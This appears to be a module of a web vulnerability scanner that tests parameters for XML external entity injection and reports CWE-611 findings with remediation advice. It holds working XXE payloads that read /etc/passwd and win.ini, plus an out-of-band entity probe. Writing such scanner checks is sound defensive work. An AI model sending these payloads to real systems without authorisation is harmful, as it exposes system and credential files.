import httpx
from modules.scanner.base_check import BaseCheck, CheckResult

XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>""",
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://127.0.0.1:9999/xxe"> %remote;]><root/>""",
]


class XxeCheck(BaseCheck):
    name = "active_xxe"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=10) as client:
            for param in target_params:
                for payload in XXE_PAYLOADS:
                    modified = self._inject_body(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        body = resp.text
                        if "root:x:0:0:" in body or "[fonts]" in body:
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title="XXE detected — file read via external entity",
                                description=f"Parameter '{param}' is vulnerable to XML External Entity injection.",
                                evidence=f"Payload: {payload[:100]}...",
                                remediation="Disable XML external entity processing. Use JSON instead of XML where possible.",
                                cwe="CWE-611",
                            ))
                    except Exception:
                        continue
        return results

    def _inject_body(self, base: dict, param: str, payload: str) -> dict:
        import copy
        req = copy.deepcopy(base)
        req["content"] = payload
        req["headers"]["Content-Type"] = "application/xml"
        return req
